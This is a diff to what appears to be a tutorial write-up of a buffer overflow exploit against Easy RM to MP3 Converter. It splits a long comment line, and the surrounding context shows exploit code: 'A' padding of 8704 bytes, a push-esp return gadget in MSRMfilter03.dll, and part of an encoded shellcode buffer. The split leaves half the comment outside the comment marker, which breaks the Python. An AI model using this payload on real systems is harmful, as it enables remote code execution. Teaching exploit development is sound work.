@@ -295,7 +295,8 @@ Updated PoC:
 ```term_session
 import struct
 
-pushesp = struct.pack("<I", 0x1001B058) # 0x1001b058 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)
+pushesp = struct.pack("<I", 0x1001B058) # 0x1001b058 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, 
+SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)
 
 buffer = "A" * 8704 + pushesp + "\xff" * 200 
 
@@ -408,7 +409,8 @@ buf += b"\x47\x46\x73\x64\x32\x62\x4f\x72\x4a\x65\x50\x71\x43"
 buf += b"\x69\x6f\x4e\x35\x53\x53\x30\x61\x42\x4c\x75\x33\x76"
 buf += b"\x4e\x75\x35\x61\x68\x61\x75\x37\x70\x41\x41"
 
-pushesp = struct.pack("<I", 0x1001B058) # 0x1001b058 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)
+pushesp = struct.pack("<I", 0x1001B058) # 0x1001b058 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, 
+SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)
 
 buffer = "A" * 8704 + pushesp + buf + "\xff" * 200 
 
